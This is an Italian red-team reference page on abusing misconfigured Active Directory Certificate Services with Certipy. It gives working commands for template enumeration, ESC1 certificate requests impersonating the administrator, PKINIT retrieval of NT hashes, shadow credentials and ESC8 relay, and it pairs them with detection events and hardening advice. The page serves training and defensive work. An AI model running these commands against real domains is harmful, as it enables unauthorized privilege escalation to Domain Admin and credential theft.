> [English](README.en.md) | **Italiano**

# Certipy - abuso di Active Directory certificate services

> - **Fase:** Privilege Escalation / Credential Access nel dominio - abuso di AD CS (PKINIT, template vulnerabili, relay)
> - **Visibilita:** Media - richieste di certificato alla CA (Event ID 4886/4887) e autenticazioni PKINIT (4768 con certificato) tracciabili
> - **Prerequisiti:** credenziali di dominio a basso privilegio; una CA AD CS raggiungibile con almeno una misconfigurazione (template ESC1-ESC16, endpoint web ESC8)
> - **Tecnica:** `Certipy (AD CS abuse)` | **Severity tipica:** `Critico` | **Finding ID:** da assegnare in lab

- Obiettivo: riferimento operativo consolidato di Certipy per enumerare e sfruttare le misconfigurazioni AD CS, ottenendo certificati che consentono l'autenticazione come utenti privilegiati (fino a Domain Admin) e l'estrazione dell'NT hash.

---

## Executive summary

Certipy e lo strumento di riferimento per l'abuso di Active Directory Certificate Services da Linux. AD CS, se
mal configurato, trasforma una CA in un percorso diretto verso Domain Admin: un certificato di autenticazione
emesso per conto di un utente privilegiato equivale alle sue credenziali (PKINIT, quindi TGT e NT hash). Certipy
copre l'intero flusso: enumerazione delle misconfigurazioni (ESC1-ESC16), richiesta/forgiatura dei certificati,
autenticazione PKINIT, shadow credentials e relay (ESC8). E uno dei percorsi di escalation piu affidabili in AD
moderno, spesso `Critico`.

## Esecuzione / comandi

### Fase 1 - enumerazione delle misconfigurazioni

```bash
# enumera CA e template, evidenziando quelli vulnerabili (ESC1..ESC16)
certipy find -u lowpriv@lab.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# produce anche un report; cercare 'ESCx' e i permessi di enrollment
```

### Fase 2 - ESC1 (template che consente SAN arbitrario)

```bash
# richiede un certificato per il template vulnerabile specificando un UPN privilegiato (SAN)
certipy req -u lowpriv@lab.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca 'LAB-CA' -template 'VulnTemplate' -upn 'administrator@lab.local'
# -> administrator.pfx

# autenticazione PKINIT con il certificato -> TGT + NT hash dell'administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
# [*] Got hash for 'administrator@lab.local': aad3b...:<NThash>   <-- credenziali del DA
```

### Shadow credentials (GenericWrite sul target) ed ESC8 (relay)

```bash
# shadow credentials: aggiunge un KeyCredentialLink, autentica via PKINIT e restituisce l'NT hash
certipy shadow auto -u lowpriv@lab.local -p 'Password1' -account 'svc_sql' -dc-ip 10.10.10.10

# ESC8: relay dell'autenticazione NTLM (coerced) verso l'endpoint web della CA per emettere un cert
certipy relay -target 'http://ca01.lab.local/certsrv/certfnsh.asp' -template 'DomainController'
# combinare con la coercion (PetitPotam/Coercer) verso l'attaccante
```

Output illustrativo (rappresentativo):

```
certipy find ... -vulnerable
[!] Vulnerabilities: ESC1 - 'Domain Users' can enroll and supply arbitrary SAN   <-- template sfruttabile
```

## Analisi dei risultati

Un template con enrollment aperto e SAN arbitrario (ESC1) consente di emettere un certificato per
l'administrator e autenticarsi come lui: escalation diretta a Domain Admin (`Critico`). Lo shadow credential
estende l'abuso a qualsiasi oggetto su cui si ha GenericWrite; ESC8 sfrutta l'endpoint web + coercion per
ottenere un certificato di un Domain Controller. Il certificato e credenziale persistente: resta valido anche
dopo il cambio password, finche non scade/revocato.

### Analisi teorica

AD CS introduce una seconda radice di fiducia (i certificati) accanto alle password: una misconfigurazione del
template rompe l'assunzione che solo chi conosce il segreto possa autenticarsi come un principal. La difesa e
nel modello della PKI: rimuovere il flag di SAN arbitrario (`ENROLLEE_SUPPLIES_SUBJECT`), restringere i permessi
di enrollment, abilitare l'approvazione del manager e disabilitare l'autenticazione NTLM verso gli endpoint web
della CA (Extended Protection).

## Remediation (blue team)

**Rilevamento.** Richieste di certificato (Event ID 4886/4887) con SAN che non corrisponde al richiedente;
autenticazioni PKINIT (4768 con certificato) per account privilegiati; modifiche a `msDS-KeyCredentialLink`
(5136); coercion seguita da richieste alla CA.

**Hardening.** Rimuovere `ENROLLEE_SUPPLIES_SUBJECT` dai template; restringere i permessi di enrollment e
abilitare l'approvazione; Extended Protection for Authentication (EPA) e HTTPS-only sugli endpoint web della CA;
monitorare e, dove serve, mappare la SAN in modo forte (`StrongCertificateBindingEnforcement`).

---

## Scenario reale: proiezione post-exploitation

> Vale per l'esito "cert per utente privilegiato fino a Domain Admin" (severity Critico).

**Red team:** da `Domain Users`, `certipy find` individua un template ESC1; `certipy req` emette un cert per
l'administrator; `certipy auth` restituisce TGT e NT hash. Il certificato resta valido come backdoor anche dopo
il reset della password (persistenza). ESC8 consente la compromissione del dominio partendo da una semplice
coercion.

**Blue team:** correlare 4886/4887 con SAN anomala e l'origine a basso privilegio; contenere revocando i
certificati emessi e ruotando il KRBTGT se il TGT e stato forgiato; eradicare correggendo i template. Lezione:
la PKI interna e un vettore di escalation tanto quanto le ACL, e va sottoposta ad audit con lo stesso rigore.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Certipy` | ad cs abuse | cli - attivo | enumerazione e sfruttamento end-to-end di ad cs (esc1-esc16, pkinit, relay) |
| `Certify` / `Certutil` | ad cs (windows) | cli - attivo | equivalente lato windows (c#) per enum e richiesta certificati |
| `PetitPotam` / `Coercer` | coercion | cli - attivo | forza l'autenticazione del dc verso il relay (esc8) |
| `impacket` (ntlmrelayx) | relay | cli - attivo | relay ntlm verso l'endpoint web della ca |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| credential access | steal or forge authentication certificates | `T1649` | emissione/forgiatura di certificati ad cs per autenticarsi come utenti privilegiati. |
| persistence/privesc | account manipulation | `T1098` | shadow credentials: aggiunta di un keycredentiallink per pkinit. |

---

## Correlazioni con altri moduli

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [esc-enumeration](<../esc-enumeration/README.md>) | certipy (`find`) | individua i template e gli endpoint vulnerabili |
| certipy (`req`/`auth`) | [esc1-template-abuse](<../esc1-template-abuse/README.md>) | sfrutta il san arbitrario per impersonare un utente privilegiato |
| certipy (`relay`) | [esc8-relay-adcs](<../esc8-relay-adcs/README.md>) | relay dell'autenticazione verso l'endpoint web della ca |
| certipy (`shadow`) | [shadow-credentials](<../../05-credential-dumping/shadow-credentials/README.md>) | usa il keycredentiallink per ottenere l'nt hash via pkinit |

---

> **Nota:** Contenuto didattico. I comandi sono funzionanti e vanno eseguiti esclusivamente in laboratori propri o con autorizzazione esplicita. Output illustrativi, non da sistemi reali.
